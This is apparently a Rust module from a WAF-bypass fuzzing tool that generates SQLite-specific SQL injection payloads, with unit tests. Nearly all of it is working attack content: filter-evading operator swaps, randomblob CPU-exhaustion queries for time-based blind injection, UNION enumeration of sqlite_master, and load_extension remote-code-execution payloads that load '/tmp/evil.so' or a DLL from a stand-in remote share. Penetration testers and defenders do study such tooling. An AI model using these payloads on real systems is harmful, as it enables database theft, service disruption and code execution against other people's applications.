//! SQLite-specific SQL grammar mutations.
//!
//! SQLite has unique WAF bypass features:
//! - `GLOB` / `MATCH` operators (alternatives to `=` and `LIKE`)
//! - No built-in `SLEEP()` — CPU exhaustion via `randomblob()` or heavy `LIKE`
//! - `||` concatenation as standard
//! - `load_extension()` for RCE
//! - `sqlite_master` table for schema enumeration
//! - `CASE` expressions as alternatives to IF()
//! - `typeof()` for type probing

/// Generate SQLite-specific mutations for a payload.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
    let mut results = Vec::new();
    let lower = payload.to_ascii_lowercase();

    // ── GLOB / MATCH / LIKE alternatives ──
    if lower.contains('=') {
        results.push(payload.replace('=', " GLOB "));
        results.push(payload.replace('=', " MATCH "));
    }

    // ── CPU exhaustion (time-based blind) ──
    // SQLite has no SLEEP — use computation-heavy operations
    results.push("SELECT hex(randomblob(500000000))".into());
    results.push("SELECT randomblob(1000000000)".into());
    results.push("SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))".into());

    // ── || concatenation standard ──
    if lower.contains("concat(") {
        results.push(payload.replace("CONCAT(", "(").replace(',', "||"));
    }

    // ── load_extension RCE vector ──
    if results.len() < max_mutations {
        results.push("SELECT load_extension('/tmp/evil.so')".into());
        results.push("SELECT load_extension('\\\\evil\\share\\evil.dll')".into());
    }

    // ── sqlite_master schema enumeration ──
    if results.len() < max_mutations {
        let base = payload.trim_end_matches("--").trim_end_matches('#');
        results.push(format!("{base} UNION SELECT name,sql FROM sqlite_master--"));
        results.push(format!(
            "{base} UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--"
        ));
    }

    // ── CASE expression as IF() alternative ──
    if results.len() < max_mutations {
        results.push(format!(
            "{} AND CASE WHEN 1=1 THEN 1 ELSE 0 END--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
    }

    // ── typeof() for type probing ──
    if results.len() < max_mutations {
        results.push(format!(
            "{} AND typeof(1)='integer'--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
    }

    // ── Unicode string via X'hex' notation ──
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'')
    {
        let inner = &payload[start + 1..start + 1 + end];
        if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
            let hex: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
            results.push(format!(
                "{}X'{}'{}",
                &payload[..start],
                hex,
                &payload[start + 1 + end + 1..]
            ));
        }
    }

    // ── printf() string construction ──
    if results.len() < max_mutations {
        results.push("SELECT printf('%s','admin')".into());
    }

    // ── Subquery in WHERE ──
    if lower.contains("where") && results.len() < max_mutations {
        results.push(format!(
            "{} AND (SELECT count(*) FROM sqlite_master)>0--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn glob_match_generated() {
        let mutations = mutate("1=1", 10);
        assert!(mutations.iter().any(|m| m.contains("GLOB")));
    }

    #[test]
    fn sqlite_specific_functions() {
        let mutations = mutate("SELECT 1", 20);
        assert!(mutations.iter().any(|m| m.contains("randomblob")));
    }

    #[test]
    fn sqlite_master_enumeration() {
        let mutations = mutate("' OR 1=1--", 20);
        assert!(mutations.iter().any(|m| m.contains("sqlite_master")));
    }

    #[test]
    fn hex_notation() {
        let mutations = mutate("' OR 'admin'='admin'--", 20);
        assert!(mutations.iter().any(|m| m.contains("X'")));
    }

    #[test]
    fn case_expression() {
        let mutations = mutate("' OR 1=1--", 20);
        assert!(mutations.iter().any(|m| m.contains("CASE WHEN")));
    }

    #[test]
    fn typeof_probe() {
        let mutations = mutate("' OR 1=1--", 20);
        assert!(mutations.iter().any(|m| m.contains("typeof")));
    }

    #[test]
    fn load_extension_rce() {
        let mutations = mutate("SELECT 1", 20);
        assert!(mutations.iter().any(|m| m.contains("load_extension")));
    }
}
